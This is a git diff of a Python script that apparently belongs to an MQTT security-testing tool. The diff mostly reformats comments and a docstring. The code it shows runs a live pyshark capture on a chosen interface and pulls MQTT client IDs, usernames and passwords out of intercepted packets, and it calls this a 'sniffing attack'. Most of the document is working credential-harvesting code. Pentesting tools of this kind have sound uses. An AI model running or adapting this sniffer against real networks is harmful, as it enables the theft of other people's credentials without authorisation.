@@ -1,6 +1,9 @@
 import pyshark
 import concurrent.futures
 
+
+# Try to sniff the packets, looking for credentials or client-ids.
+
 # custom class to store a username and the related password (if found)
 class Credentials:
     def __init__(self):
@@ -99,31 +102,35 @@ def get_info(pkt):
 
     credential = Credentials()
     num_packets+=1
-    #try to get the client-id from the intercepted message
+    # try to get the client-id from the intercepted message
     try:
         clientids.append(pkt['mqtt'].clientid)
     except:
         pass
-    #try to get the username from the intercepted message
+    # try to get the username from the intercepted message
     try:
         credential.add_username(pkt['mqtt'].username)
     except:
         pass
-    #try to get the password from the intercepted message
+    # try to get the password from the intercepted message
     try:
         credential.add_password(pkt['mqtt'].passwd)
     except:
         pass
-    # we check if the credential object is empty using a boolean flag and if it is not
-    # we add it to the array
+
+    # check if the credential object is empty using a boolean flag
+    # if it is not ->  add it to the array
+
     if credential.empty == False:
         credentials[credential.username] = credential
 
 
-"""Performs the sniffing ttack
+"""
+Performs the sniffing attack
+
 Parameters:
-    interface (str): network interface to sniff over for MQTT packets
-    listening_time (int): duration of the sniffing attack
+    interface (str):        network interface to sniff over for MQTT packets
+    listening_time (int):   duration of the sniffing attack
 Returns:
     credentials, clientids ([Credentials]), ([str]): an array of Credentials objects containing
                                                      usernames and passwords and an array of string
@@ -135,13 +142,13 @@ def sniffing_attack(interface, listening_time, port):
     global clientids
     global num_packets
     # use pyshark to sniff over the specified interface
-    # we also specify that we want to listen only for MQTT packets
+    # specify that we want to listen only for MQTT packets
     cap = pyshark.LiveCapture(interface=interface, display_filter='mqtt', decode_as={"tcp.port=="+str(port)+"": "mqtt"})
     try:
         # when an MQTT packet is intercepted call the function get_info
-        # here we define also the timeout of the attack
+        # and define the timeout of the attack
         cap.apply_on_packets(get_info, timeout=float(listening_time))
-        #cap.sniff()
+
     except concurrent.futures.TimeoutError:
         print("Sniffing terminated: "+str(num_packets)+" packets intercepted on "+interface)
         pass
@@ -160,7 +167,6 @@ if __name__=="__main__":
     cap = pyshark.LiveCapture(interface=inf, display_filter='mqtt', decode_as={"tcp.port=="+str(port)+"": "mqtt"})
     try:
         cap.apply_on_packets(print_info, timeout=float(time))
-        #cap.sniff()
     except concurrent.futures.TimeoutError:
         print("\nSniffing terminated: "+str(num_packets)+" packets intercepted on "+inf)
         i = 1
